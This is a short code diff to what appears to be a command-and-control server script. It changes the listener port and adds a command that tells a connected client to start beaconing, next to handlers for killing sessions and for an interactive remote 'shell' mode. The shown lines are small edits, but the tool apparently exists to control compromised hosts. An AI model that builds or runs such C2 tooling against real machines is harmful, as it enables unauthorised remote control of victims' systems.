@@ -9,7 +9,7 @@ from signal import SIGTERM
 VERBOSE = True
 
 listen_addr = '0.0.0.0'
-listen_port = 8080
+listen_port = 8081
 ###NEED TO WRITE EACH FILE ON EXECUTE THEN DELETE ON EXIT
 
 def create_keys():
@@ -236,7 +236,8 @@ def listen():
                     elif cmd == "3": # If we got terminate command, inform the client and close the connect and break the loop
                         kill_session(conn, source)
                         break
-                    elif cmd == "4":
+                    elif cmd == "4":        #start beaconing
+                        send_data(conn, "[BEACON]START")
                         kill(getpid(), SIGTERM)
                     elif cmd == "shell":
                         while cmd == "shell":
